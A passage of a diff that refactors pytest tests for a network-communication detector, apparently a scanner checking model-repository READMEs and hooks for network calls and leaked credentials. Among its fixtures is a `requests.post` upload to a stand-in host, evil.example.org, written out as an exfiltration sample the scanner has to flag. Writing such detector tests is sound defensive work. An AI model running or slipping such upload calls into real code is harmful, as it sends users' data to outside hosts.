@@ -58,6 +58,65 @@ def _pad_python_fence(example: str, target_size: int) -> bytes:
     return f"```python\n{example}#{'x' * (padding - 2)}\n```\n".encode()
 
 
+def _assert_live_transfer_alias_detected(mapping_flow: str) -> None:
+    data = (
+        "```python\nimport requests\nfrom PIL import Image\n"
+        "from transformers import AutoModel, AutoProcessor\n"
+        "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+        "image = Image.open(requests.get(image_url, stream=True).raw)\n"
+        "processor = AutoProcessor.from_pretrained('official/model')\n"
+        "model = AutoModel.from_pretrained('official/model')\n"
+        f"{mapping_flow}"
+        "model.generate(**device_inputs)\n```\n"
+    ).encode()
+
+    findings = NetworkCommDetector().scan(data, "README.md")
+
+    assert any(finding["type"] == "network_library" for finding in findings)
+    assert any(finding["type"] == "network_function" for finding in findings)
+
+
+def _assert_detached_transfer_alias_allowed(mapping_flow: str) -> None:
+    data = (
+        "```python\nimport requests\nfrom PIL import Image\n"
+        "from transformers import AutoModel, AutoProcessor\n"
+        "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+        "image = Image.open(requests.get(image_url, stream=True).raw)\n"
+        "processor = AutoProcessor.from_pretrained('official/model')\n"
+        "model = AutoModel.from_pretrained('official/model')\n"
+        f"{mapping_flow}"
+        "model.generate(**device_inputs)\n```\n"
+    ).encode()
+
+    _assert_readme_network_info(data)
+
+
+def _assert_safe_readme_model_flow(model_flow: str) -> None:
+    data = (
+        "```python\nimport requests\nfrom transformers import AutoModel\n"
+        "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+        f"{model_flow}"
+        "requests.get(image_url, stream=True)\n```\n"
+    ).encode()
+
+    findings = NetworkCommDetector().scan(data, "README.md")
+
+    assert findings
+    assert all(finding["severity"] == "INFO" for finding in findings)
+    assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+
+
+def _assert_unproven_readme_model_flow(model_flow: str) -> None:
+    data = (
+        "```python\nimport requests\nfrom transformers import AutoModel\n"
+        "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+        f"{model_flow}"
+        "requests.get(image_url, stream=True)\n```\n"
+    ).encode()
+
+    _assert_network_library_and_function(data, "README.md")
+
+
 class TestNetworkCommDetector:
     """Test the NetworkCommDetector class."""
 
@@ -423,10 +482,7 @@ class TestNetworkCommDetector:
         data = f"https://example.com/path/{path_token},".encode()
 
         findings = detector.scan(data, "metadata.txt")
-        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
-
-        assert url_finding["url"] == "https://example.com/path/<redacted>,"
-        assert path_token not in json.dumps(url_finding, sort_keys=True)
+        _assert_redacted_path_token(findings, path_token, "https://example.com/path/<redacted>,")
 
     def test_quoted_path_delimiters_do_not_prevent_token_redaction(self) -> None:
         """Single-quoted source strings should not keep path tokens raw."""
@@ -435,10 +491,7 @@ class TestNetworkCommDetector:
         data = f"url='https://example.com/path/{path_token}'".encode()
 
         findings = detector.scan(data, "metadata.txt")
-        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
-
-        assert url_finding["url"] == "https://example.com/path/<redacted>"
-        assert path_token not in json.dumps(url_finding, sort_keys=True)
+        _assert_redacted_path_token(findings, path_token, "https://example.com/path/<redacted>")
 
     def test_base64_path_capability_tokens_are_redacted(self) -> None:
         """Base64/base64url path tokens may contain encoded separators or padding."""
@@ -457,10 +510,7 @@ class TestNetworkCommDetector:
         path_token = "AbCdEfGhIjKlMnOpQrStUvWxYz123456-_"
 
         findings = detector.scan(f"https://example.com/download/{path_token}".encode(), "metadata.txt")
-        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
-
-        assert url_finding["url"] == "https://example.com/download/<redacted>"
-        assert path_token not in json.dumps(url_finding, sort_keys=True)
+        _assert_redacted_path_token(findings, path_token, "https://example.com/download/<redacted>")
 
     def test_long_base64_path_capability_tokens_use_entropy_not_unique_ratio(self) -> None:
         """Long signed-CDN style path tokens should still be redacted."""
@@ -491,10 +541,7 @@ class TestNetworkCommDetector:
         path_token = "AbCdEfGhIjKlMnOpQrStUvWx.Yz1234567890abcdefGhij.Klmn"
 
         findings = detector.scan(f"https://example.com/download/{path_token}".encode(), "metadata.txt")
-        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
-
-        assert url_finding["url"] == "https://example.com/download/<redacted>"
-        assert path_token not in json.dumps(url_finding, sort_keys=True)
+        _assert_redacted_path_token(findings, path_token, "https://example.com/download/<redacted>")
 
     def test_path_parameter_tokens_are_redacted(self) -> None:
         """Matrix-style path parameters can carry capability tokens."""
@@ -505,10 +552,7 @@ class TestNetworkCommDetector:
             f"https://example.com/download;token={path_token}/model.bin".encode(),
             "metadata.txt",
         )
-        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
-
-        assert url_finding["url"] == "https://example.com/download;token=<redacted>/model.bin"
-        assert path_token not in json.dumps(url_finding, sort_keys=True)
+        _assert_redacted_path_token(findings, path_token, "https://example.com/download;token=<redacted>/model.bin")
 
     def test_path_parameter_key_value_parts_are_redacted(self) -> None:
         """Matrix-style sensitive keys can carry their value in the next part."""
@@ -566,10 +610,7 @@ class TestNetworkCommDetector:
             f"https://example.com/download%3Btoken={path_token}/model.bin".encode(),
             "metadata.txt",
         )
-        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
-
-        assert url_finding["url"] == "https://example.com/download;token=<redacted>/model.bin"
-        assert path_token not in json.dumps(url_finding, sort_keys=True)
+        _assert_redacted_path_token(findings, path_token, "https://example.com/download;token=<redacted>/model.bin")
 
     def test_path_parameter_key_tokens_are_redacted(self) -> None:
         """Matrix parameter names can carry capability tokens too."""
@@ -580,10 +621,7 @@ class TestNetworkCommDetector:
             f"https://example.com/download;{path_token}=1/model.bin".encode(),
             "metadata.txt",
         )
-        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
-
-        assert url_finding["url"] == "https://example.com/download;<redacted>=1/model.bin"
-        assert path_token not in json.dumps(url_finding, sort_keys=True)
+        _assert_redacted_path_token(findings, path_token, "https://example.com/download;<redacted>=1/model.bin")
 
     def test_path_segment_tokens_before_matrix_parameters_are_redacted(self) -> None:
         """A token segment followed by benign matrix params should still be redacted."""
@@ -594,10 +632,7 @@ class TestNetworkCommDetector:
             f"https://example.com/path/{path_token};v=1/model.bin".encode(),
             "metadata.txt",
         )
-        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
-
-        assert url_finding["url"] == "https://example.com/path/<redacted>;v=1/model.bin"
-        assert path_token not in json.dumps(url_finding, sort_keys=True)
+        _assert_redacted_path_token(findings, path_token, "https://example.com/path/<redacted>;v=1/model.bin")
 
     def test_authorization_matrix_assignment_redacts_following_payload(self) -> None:
         """A scheme-only Authorization parameter must carry redaction to the next matrix field."""
@@ -849,10 +884,7 @@ class TestNetworkCommDetector:
         repo_id = "Llama-3.1-70B-Instruct"
         data = f"https://huggingface.co/meta-llama/{repo_id}".encode()
 
-        findings = detector.scan(data, "metadata.txt")
-        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
-
-        assert url_finding["url"] == f"https://huggingface.co/meta-llama/{repo_id}"
+        _assert_hf_repository_url(detector, data, repo_id, "https://huggingface.co/meta-llama/")
 
     def test_single_segment_huggingface_model_ids_are_preserved(self) -> None:
         """Single-component public Hugging Face model URLs should stay useful."""
@@ -860,10 +892,7 @@ class TestNetworkCommDetector:
         repo_id = "Llama-3.1-70B-Instruct"
         data = f"https://huggingface.co/{repo_id}".encode()
 
-        findings = detector.scan(data, "metadata.txt")
-        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
-
-        assert url_finding["url"] == f"https://huggingface.co/{repo_id}"
+        _assert_hf_repository_url(detector, data, repo_id, "https://huggingface.co/")
 
     def test_huggingface_api_repository_ids_are_preserved(self) -> None:
         """Hugging Face API paths should keep public repo IDs for audit follow-up."""
@@ -871,10 +900,7 @@ class TestNetworkCommDetector:
         repo_id = "Llama-3.1-70B-Instruct"
         data = f"https://huggingface.co/api/models/meta-llama/{repo_id}".encode()
 
-        findings = detector.scan(data, "metadata.txt")
-        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
-
-        assert url_finding["url"] == f"https://huggingface.co/api/models/meta-llama/{repo_id}"
+        _assert_hf_repository_url(detector, data, repo_id, "https://huggingface.co/api/models/meta-llama/")
 
     @pytest.mark.parametrize("route", ["datasets", "spaces"])
     def test_huggingface_prefixed_repository_ids_are_preserved(self, route: str) -> None:
@@ -927,10 +953,7 @@ class TestNetworkCommDetector:
         path_token = "0123456789abcdef0123456789abcdef"
 
         findings = detector.scan(f"https://example.com/download/{path_token}".encode(), "metadata.txt")
-        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
-
-        assert url_finding["url"] == "https://example.com/download/<redacted>"
-        assert path_token not in json.dumps(url_finding, sort_keys=True)
+        _assert_redacted_path_token(findings, path_token, "https://example.com/download/<redacted>")
 
     def test_two_class_high_entropy_path_tokens_are_redacted(self) -> None:
         """Base32/base36-style bearer tokens may only use lowercase letters and digits."""
@@ -938,10 +961,7 @@ class TestNetworkCommDetector:
         path_token = "0123456789abcdefghjkmnpqrstvwxyz"
 
         findings = detector.scan(f"https://example.com/download/{path_token}/model.bin".encode(), "metadata.txt")
-        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
-
-        assert url_finding["url"] == "https://example.com/download/<redacted>/model.bin"
-        assert path_token not in json.dumps(url_finding, sort_keys=True)
+        _assert_redacted_path_token(findings, path_token, "https://example.com/download/<redacted>/model.bin")
 
     def test_dotted_path_tokens_do_not_leak_as_domain_findings(self) -> None:
         """Domain-like path tokens should not leak through the later domain detector."""
@@ -949,10 +969,7 @@ class TestNetworkCommDetector:
         path_token = "0123456789abcdefghjkmnpqrstvwxyz.com"
 
         findings = detector.scan(f"https://example.com/download/{path_token}/model.bin".encode(), "metadata.txt")
-        serialized = json.dumps(findings, sort_keys=True)
-
-        assert "https://example.com/download/<redacted>/model.bin" in serialized
-        assert path_token not in serialized
+        _assert_serialized_path_token_isolation(findings, path_token)
 
     def test_backtick_wrapped_dotted_path_tokens_do_not_leak_as_domain_findings(self) -> None:
         """Markdown code delimiters should not hide the URL around a dotted path token."""
@@ -960,10 +977,7 @@ class TestNetworkCommDetector:
         path_token = "0123456789abcdefghjkmnpqrstvwxyz.com"
 
         findings = detector.scan(f"`https://example.com/download/{path_token}/model.bin`".encode(), "metadata.txt")
-        serialized = json.dumps(findings, sort_keys=True)
-
-        assert "https://example.com/download/<redacted>/model.bin" in serialized
-        assert path_token not in serialized
+        _assert_serialized_path_token_isolation(findings, path_token)
 
     def test_parenthesized_dotted_path_tokens_do_not_leak_as_domain_findings(self) -> None:
         """Parenthesized call URLs should still suppress redacted path-token domain hits."""
@@ -973,10 +987,7 @@ class TestNetworkCommDetector:
         findings = detector.scan(
             f"requests.get(https://example.com/download/{path_token}/model.bin)".encode(), "metadata.txt"
         )
-        serialized = json.dumps(findings, sort_keys=True)
-
-        assert "https://example.com/download/<redacted>/model.bin" in serialized
-        assert path_token not in serialized
+        _assert_serialized_path_token_isolation(findings, path_token)
 
     def test_markdown_link_dotted_path_tokens_do_not_leak_as_domain_findings(self) -> None:
         """Markdown-link parentheses should bound URL domain suppression."""
@@ -986,10 +997,7 @@ class TestNetworkCommDetector:
         findings = detector.scan(
             f"[model](https://example.com/download/{path_token}/model.bin)".encode(), "metadata.txt"
         )
-        serialized = json.dumps(findings, sort_keys=True)
-
-        assert "https://example.com/download/<redacted>/model.bin" in serialized
-        assert path_token not in serialized
+        _assert_serialized_path_token_isolation(findings, path_token)
 
     def test_domain_suppression_url_lookup_is_bounded(self) -> None:
         """Domain suppression should not scan unbounded whitespace-free buffers."""
@@ -1004,29 +1012,11 @@ class TestNetworkCommDetector:
 
     def test_long_url_credentials_do_not_reappear_as_domain_findings(self) -> None:
         """Indexed URL spans should protect credentials beyond the bounded fallback window."""
-        secret = "secret-value.example.com"
-        data = (
-            b"https://example.com/"
-            + b"a" * (network_comm._MAX_URL_TEXT_LOOKUP_BYTES + 1)
-            + f"/api_key/{secret}/model.bin".encode()
-        )
-
-        findings = NetworkCommDetector().scan(data, "hook.py")
-
-        assert secret not in json.dumps(findings, sort_keys=True)
+        _assert_long_url_secret_isolation("secret-value.example.com")
 
     def test_long_url_credentials_do_not_reappear_as_ip_findings(self) -> None:
         """Long URL paths must not let a redacted IP-shaped credential become a second finding."""
-        secret = "45.33.32.156"
-        data = (
-            b"https://example.com/"
-            + b"a" * (network_comm._MAX_URL_TEXT_LOOKUP_BYTES + 1)
-            + f"/api_key/{secret}/model.bin".encode()
-        )
-
-        findings = NetworkCommDetector().scan(data, "hook.py")
-
-        assert secret not in json.dumps(findings, sort_keys=True)
+        _assert_long_url_secret_isolation("45.33.32.156")
 
     def test_encoded_path_separator_tokens_are_redacted(self) -> None:
         """Encoded separators should not make a token and following artifact look benign."""
@@ -1034,10 +1024,7 @@ class TestNetworkCommDetector:
         path_token = "AbCdEfGhIjKlMnOpQrStUvWxYz012345"
 
         findings = detector.scan(f"https://example.com/download/{path_token}%2Fweights.bin".encode(), "metadata.txt")
-        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
-
-        assert url_finding["url"] == "https://example.com/download/<redacted>%2Fweights.bin"
-        assert path_token not in json.dumps(url_finding, sort_keys=True)
+        _assert_redacted_path_token(findings, path_token, "https://example.com/download/<redacted>%2Fweights.bin")
 
     @pytest.mark.parametrize("separator", [":", "%3A"])
     def test_colon_delimited_path_tokens_are_redacted(self, separator: str) -> None:
@@ -1060,10 +1047,7 @@ class TestNetworkCommDetector:
         path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"
 
         findings = detector.scan(f"https://example.com/download/{path_token}.bin".encode(), "metadata.txt")
-        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
-
-        assert url_finding["url"] == "https://example.com/download/<redacted>.bin"
-        assert path_token not in json.dumps(url_finding, sort_keys=True)
+        _assert_redacted_path_token(findings, path_token, "https://example.com/download/<redacted>.bin")
 
     def test_urlsafe_artifact_filename_stems_are_redacted(self) -> None:
         """URL-safe base64 token stems may include hyphen and underscore before artifact suffixes."""
@@ -1071,10 +1055,7 @@ class TestNetworkCommDetector:
         path_token = "AbCdEfGhIjKlMnOpQrStUvWxYz123456-_"
 
         findings = detector.scan(f"https://example.com/download/{path_token}.bin".encode(), "metadata.txt")
-        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
-
-        assert url_finding["url"] == "https://example.com/download/<redacted>.bin"
-        assert path_token not in json.dumps(url_finding, sort_keys=True)
+        _assert_redacted_path_token(findings, path_token, "https://example.com/download/<redacted>.bin")
 
     def test_lowercase_urlsafe_artifact_filename_stems_are_redacted(self) -> None:
         """Lowercase URL-safe token stems with separators should still be entropy-checked."""
@@ -1082,10 +1063,7 @@ class TestNetworkCommDetector:
         path_token = "abcdefghjkmnpqrstvwxyz0123456789-_"
 
         findings = detector.scan(f"https://example.com/download/{path_token}.bin".encode(), "metadata.txt")
-        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
-
-        assert url_finding["url"] == "https://example.com/download/<redacted>.bin"
-        assert path_token not in json.dumps(url_finding, sort_keys=True)
+        _assert_redacted_path_token(findings, path_token, "https://example.com/download/<redacted>.bin")
 
     @pytest.mark.parametrize(
         "url",
@@ -1599,12 +1577,7 @@ class TestNetworkCommDetector:
         endpoint: str,
     ) -> None:
         """Credential assignments must not reappear through generic endpoint scanners."""
-        findings = NetworkCommDetector().scan(data, "hook.py")
-
-        assert secret not in json.dumps(findings, sort_keys=True)
-        assert any(
-            finding.get("type") == endpoint_type and finding.get(endpoint_field) == endpoint for finding in findings
-        )
+        _assert_endpoint_credential_isolation(data, secret, endpoint_type, endpoint_field, endpoint)
 
     @pytest.mark.parametrize(
         ("data", "endpoint_type", "endpoint_field", "endpoint"),
@@ -1670,12 +1643,7 @@ class TestNetworkCommDetector:
         endpoint_field: str,
         endpoint: str,
     ) -> None:
-        findings = NetworkCommDetector().scan(data, "hook.py")
-
-        assert secret not in json.dumps(findings, sort_keys=True)
-        assert any(
-            finding.get("type") == endpoint_type and finding.get(endpoint_field) == endpoint for finding in findings
-        )
+        _assert_endpoint_credential_isolation(data, secret, endpoint_type, endpoint_field, endpoint)
 
     def test_repeated_domain_is_reported_only_from_noncredential_context(self) -> None:
         """Redaction must classify the matched span rather than another copy of its value."""
@@ -3382,9 +3350,7 @@ class TestNetworkCommDetector:
             b"requests.get(image_url, stream=True)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_without_network_calls(data)
 
     @pytest.mark.parametrize(
         "image_url",
@@ -3425,10 +3391,7 @@ class TestNetworkCommDetector:
             b"requests.post('https://evil.example.org/upload')\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_network_library_and_function(data, "README.md")
 
     @pytest.mark.parametrize(
         "mutator",
@@ -3632,17 +3595,7 @@ class TestNetworkCommDetector:
         self,
         model_flow: str,
     ) -> None:
-        data = (
-            "```python\nimport requests\nfrom transformers import AutoModel\n"
-            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
-            f"{model_flow}"
-            "requests.get(image_url, stream=True)\n```\n"
-        ).encode()
-
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_unproven_readme_model_flow(model_flow)
 
     @pytest.mark.parametrize(
         "model_flow",
@@ -3692,18 +3645,7 @@ class TestNetworkCommDetector:
         self,
         model_flow: str,
     ) -> None:
-        data = (
-            "```python\nimport requests\nfrom transformers import AutoModel\n"
-            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
-            f"{model_flow}"
-            "requests.get(image_url, stream=True)\n```\n"
-        ).encode()
-
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_safe_readme_model_flow(model_flow)
 
     @pytest.mark.parametrize(
         "generate_argument",
@@ -3898,10 +3840,7 @@ class TestNetworkCommDetector:
             "runner()\n```\n"
         ).encode()
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_network_library_and_function(data, "README.md")
 
     @pytest.mark.parametrize(
         "alias_setup",
@@ -4236,10 +4175,7 @@ class TestNetworkCommDetector:
             f"{model_flow}```\n"
         ).encode()
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_network_library_and_function(data, "README.md")
 
     @pytest.mark.parametrize(
         ("alias_setup", "mapping_setup", "remote_call", "remote_key"),
@@ -4351,9 +4287,7 @@ class TestNetworkCommDetector:
             b"requests.get(image_url, stream=True)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_without_network_calls(data)
 
     def test_readme_python_example_bounds_repeated_mapping_expansion(self) -> None:
         """Repeated safe mapping expansion must stay linear in the unique AST."""
@@ -4400,11 +4334,7 @@ class TestNetworkCommDetector:
             "requests.get(image_url, stream=True)\n```\n"
         ).encode()
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_network_info(data)
 
     @pytest.mark.parametrize(
         "mapping_update",
@@ -4525,11 +4455,7 @@ class TestNetworkCommDetector:
             b"requests.get(image_url, stream=True)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_network_info(data)
 
     @pytest.mark.parametrize(
         "mapping_setup",
@@ -4569,11 +4495,7 @@ class TestNetworkCommDetector:
             "requests.get(image_url, stream=True)\n```\n"
         ).encode()
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_network_info(data)
 
     @pytest.mark.parametrize(
         "mapping_setup",
@@ -4626,10 +4548,7 @@ class TestNetworkCommDetector:
             "requests.get(image_url, stream=True)\n```\n"
         ).encode()
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_network_library_and_function(data, "README.md")
 
     def test_readme_python_example_rejects_excessively_nested_mapping_ifexp(self) -> None:
         mapping = "{'input_ids': 1}"
@@ -4696,10 +4615,7 @@ class TestNetworkCommDetector:
             "requests.get(image_url, stream=True)\n```\n"
         ).encode()
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_network_library_and_function(data, "README.md")
 
     def test_readme_python_example_rejects_excessively_nested_dict_union(self) -> None:
         union = " | ".join("{'input_ids': 1}" for _ in range(600))
@@ -4823,15 +4739,7 @@ class TestNetworkCommDetector:
         binding_count = 76
         example = _make_dense_named_callable_history_example(binding_count)
         node_count = sum(1 for _ in network_comm.ast.walk(network_comm.ast.parse(example)))
-        proof_budget = network_comm._ReadmeImageExampleProofBudget()
-        proof_charges: list[int] = []
-        original_consume = proof_budget.consume_named_callable
-
-        def record_proof_work(work: int) -> bool:
-            proof_charges.append(work)
-            return original_consume(work)
-
-        monkeypatch.setattr(proof_budget, "consume_named_callable", record_proof_work)
+        proof_budget, proof_charges = _record_proof_budget(monkeypatch)
 
         assert node_count == 573
         assert network_comm._is_valid_official_readme_sample_image_example(
@@ -4935,15 +4843,7 @@ class TestNetworkCommDetector:
             "requests.get(image_url, stream=True)\n"
         )
         node_count = sum(1 for _ in network_comm.ast.walk(network_comm.ast.parse(example)))
-        proof_budget = network_comm._ReadmeImageExampleProofBudget()
-        proof_charges: list[int] = []
-        original_consume = proof_budget.consume_named_callable
-
-        def record_proof_work(work: int) -> bool:
-            proof_charges.append(work)
-            return original_consume(work)
-
-        monkeypatch.setattr(proof_budget, "consume_named_callable", record_proof_work)
+        proof_budget, proof_charges = _record_proof_budget(monkeypatch)
 
         assert network_comm._is_valid_official_readme_sample_image_example(
             example.encode(),
@@ -5093,10 +4993,7 @@ class TestNetworkCommDetector:
             b"requests.get(image_url, stream=True)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_network_library_and_function(data, "README.md")
 
     @pytest.mark.parametrize(
         "remote_call",
@@ -5195,9 +5092,7 @@ class TestNetworkCommDetector:
             b"requests.get(image_url, stream=True)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_without_network_calls(data)
 
     def test_readme_python_example_allows_non_mutating_generate_kwargs_read(self) -> None:
         """Reading a proven mapping's length does not expose it to mutation."""
@@ -5211,11 +5106,7 @@ class TestNetworkCommDetector:
             b"requests.get(image_url, stream=True)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_network_info(data)
 
     @pytest.mark.parametrize(
         "operation",
@@ -5258,11 +5149,7 @@ class TestNetworkCommDetector:
             b"model.generate(**inputs)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_network_info(data)
 
     @pytest.mark.parametrize(
         "mapping_expression",
@@ -5480,11 +5367,7 @@ class TestNetworkCommDetector:
             f"{mapping_flow}```\n"
         ).encode()
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_network_info(data)
 
     def test_readme_python_example_allows_module_mapping_branch_join_without_torch_import(self) -> None:
         data = (
@@ -5501,11 +5384,7 @@ class TestNetworkCommDetector:
             b"model.generate(**inputs)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_network_info(data)
 
     @pytest.mark.parametrize(
         ("before_with", "inside_with", "after_with"),
@@ -5744,11 +5623,7 @@ class TestNetworkCommDetector:
             b"```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_network_info(data)
 
     @pytest.mark.parametrize(
         "compound_statement",
@@ -6047,10 +5922,7 @@ class TestNetworkCommDetector:
             "```\n"
         ).encode()
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_network_library_and_function(data, "README.md")
 
     @pytest.mark.parametrize(
         "generate_statement",
@@ -6076,11 +5948,7 @@ class TestNetworkCommDetector:
             "```\n"
         ).encode()
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_network_info(data)
 
     @pytest.mark.parametrize(
         "processor_call",
@@ -6378,11 +6246,7 @@ class TestNetworkCommDetector:
             "```\n"
         ).encode()
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_network_info(data)
 
     @pytest.mark.parametrize(
         "shadowing",
@@ -6464,11 +6328,7 @@ class TestNetworkCommDetector:
             "```\n"
         ).encode()
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_network_info(data)
 
     @pytest.mark.parametrize(
         "generate_statement",
@@ -6496,10 +6356,7 @@ class TestNetworkCommDetector:
             "```\n"
         ).encode()
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_network_library_and_function(data, "README.md")
 
     @pytest.mark.parametrize(
         "generate_statement",
@@ -6530,10 +6387,7 @@ class TestNetworkCommDetector:
             "```\n"
         ).encode()
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_network_library_and_function(data, "README.md")
 
     @pytest.mark.parametrize(
         "device_transfer",
@@ -6580,11 +6434,7 @@ class TestNetworkCommDetector:
             b"model.generate(**inputs)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_network_info(data)
 
     def test_readme_python_example_allows_renamed_mapping_device_transfer(self) -> None:
         """A safe transfer may bind a new mapping name before generate."""
@@ -6600,11 +6450,7 @@ class TestNetworkCommDetector:
             b"model.generate(**device_inputs)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_network_info(data)
 
     @pytest.mark.parametrize(
         "mapping_flow",
@@ -6661,21 +6507,7 @@ class TestNetworkCommDetector:
         self,
         mapping_flow: str,
     ) -> None:
-        data = (
-            "```python\nimport requests\nfrom PIL import Image\n"
-            "from transformers import AutoModel, AutoProcessor\n"
-            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
-            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
-            "processor = AutoProcessor.from_pretrained('official/model')\n"
-            "model = AutoModel.from_pretrained('official/model')\n"
-            f"{mapping_flow}"
-            "model.generate(**device_inputs)\n```\n"
-        ).encode()
-
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_live_transfer_alias_detected(mapping_flow)
 
     @pytest.mark.parametrize(
         "mapping_flow",
@@ -6721,22 +6553,7 @@ class TestNetworkCommDetector:
         self,
         mapping_flow: str,
     ) -> None:
-        data = (
-            "```python\nimport requests\nfrom PIL import Image\n"
-            "from transformers import AutoModel, AutoProcessor\n"
